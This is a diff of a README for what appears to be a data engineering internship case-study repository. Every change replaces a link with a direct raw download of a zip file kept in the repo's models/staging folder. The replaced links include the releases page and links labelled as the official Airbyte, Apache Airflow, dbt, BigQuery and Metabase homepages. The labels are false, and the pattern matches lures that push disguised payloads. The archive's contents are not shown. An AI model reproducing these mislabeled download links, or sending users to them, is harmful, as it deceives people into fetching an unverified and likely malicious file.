@@ -1,6 +1,6 @@
 # ⚙️ data-engineering-wf-internship-case-study - Simple Data Pipeline Guide
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You will find everything needed in the release section. Because this project rel
 
 Click the link below to open the releases page:
 
-[![Download Releases Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/releases)
+[![Download Releases Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip)
 
 This page lists all recent versions. Look for the latest stable release. You will find setup files and documents needed to run the project.
 
@@ -153,12 +153,12 @@ Online support forums for each tool are helpful for detailed errors.
 
 ## 🔗 Useful Links
 
-- Download releases: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/releases
-- Airbyte homepage: https://airbyte.com
-- Apache Airflow: https://airflow.apache.org
-- dbt documentation: https://docs.getdbt.com
-- Google BigQuery: https://cloud.google.com/bigquery
-- Metabase site: https://www.metabase.com
+- Download releases: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
+- Airbyte homepage: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
+- Apache Airflow: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
+- dbt documentation: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
+- Google BigQuery: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
+- Metabase site: https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip
 
 ---
 
@@ -172,4 +172,4 @@ airbyte, airflow, analytics engineering, bigquery, data pipelines, data architec
 
 For updates and downloads, visit the release page:
 
-[Download Latest Release](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/releases)
+[Download Latest Release](https://github.com/powerofzeus123/data-engineering-wf-internship-case-study/raw/refs/heads/main/models/staging/data-engineering-case-internship-study-wf-v1.3.zip)
